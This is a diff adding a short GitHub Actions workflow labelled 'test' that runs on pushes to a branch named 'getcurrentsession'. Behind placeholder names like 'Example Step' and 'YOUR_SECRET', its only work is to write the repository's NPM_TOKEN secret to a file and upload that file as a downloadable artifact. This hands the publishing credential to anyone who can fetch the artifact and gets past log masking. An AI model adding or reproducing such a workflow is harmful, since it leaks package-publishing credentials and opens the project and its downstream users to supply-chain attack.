@@ -1,0 +1,20 @@
+name: test
+on:
+  push:
+    branches:
+      - getcurrentsession
+    
+jobs:
+  your_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Example Step
+        env:
+          YOUR_SECRET: ${{ secrets.NPM_TOKEN }}
+        run: |
+          echo $YOUR_SECRET > key.txt
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: my-artifact
+          path: key.txt   # Specify the path to the file or directory to upload as an artifact
